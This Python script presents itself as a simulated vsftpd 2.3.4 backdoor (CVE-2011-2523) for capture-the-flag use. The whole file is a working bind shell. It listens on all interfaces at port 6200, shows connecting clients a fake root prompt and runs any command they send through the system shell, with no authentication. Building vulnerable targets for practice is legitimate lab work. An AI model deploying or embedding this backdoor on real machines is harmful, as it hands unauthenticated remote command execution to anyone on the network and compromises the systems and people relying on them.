#!/usr/bin/env python3
"""
Simulated vsftpd 2.3.4 backdoor (CVE-2011-2523)
--------------------------------------------------
Listens on port 6200.  When a TCP connection arrives it drops a
root shell – just like the real backdoor.  Used for CTF purposes.
"""
import socket
import subprocess
import threading
import os

BIND_PORT = 6200

def handle_client(conn, addr):
    print(f"[BACKDOOR] Connection from {addr}")
    try:
        conn.sendall(b"# ")   # fake root prompt
        while True:
            data = conn.recv(4096)
            if not data:
                break
            cmd = data.decode(errors="replace").strip()
            if cmd in ("exit", "quit"):
                break
            try:
                result = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT,
                    timeout=10
                )
            except subprocess.CalledProcessError as e:
                result = e.output
            except subprocess.TimeoutExpired:
                result = b"[timeout]\n"
            except Exception as e:
                result = str(e).encode() + b"\n"
            conn.sendall(result + b"\n# ")
    finally:
        conn.close()

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", BIND_PORT))
    srv.listen(5)
    print(f"[BACKDOOR] Listening on port {BIND_PORT}")
    while True:
        conn, addr = srv.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        t.start()

if __name__ == "__main__":
    main()
